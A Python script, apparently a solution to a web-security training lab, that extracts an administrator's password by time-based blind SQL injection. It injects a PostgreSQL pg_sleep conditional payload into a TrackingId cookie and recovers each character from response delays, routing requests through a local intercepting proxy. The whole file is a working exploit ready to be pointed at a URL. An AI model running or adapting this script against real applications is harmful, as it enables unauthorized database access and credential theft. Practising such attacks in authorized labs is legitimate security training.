import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ''
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = f"' || (select case when (username='administrator' and ascii(substr(password,{i},1))='{j}') then pg_sleep(3) else pg_sleep(-1) end from users)--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': 'JGnRbfac2NGKsdFv' + sqli_payload_encoded, 'session': 'JsYWuXcVQl0Kdoc0sjlmJf2LSY1A8aN3'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 2:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} www.example.com')
    url = sys.argv[1]
    print('[+] Retrieving Administrator password...')
    sqli_password(url)

if __name__ == '__main__':
    main()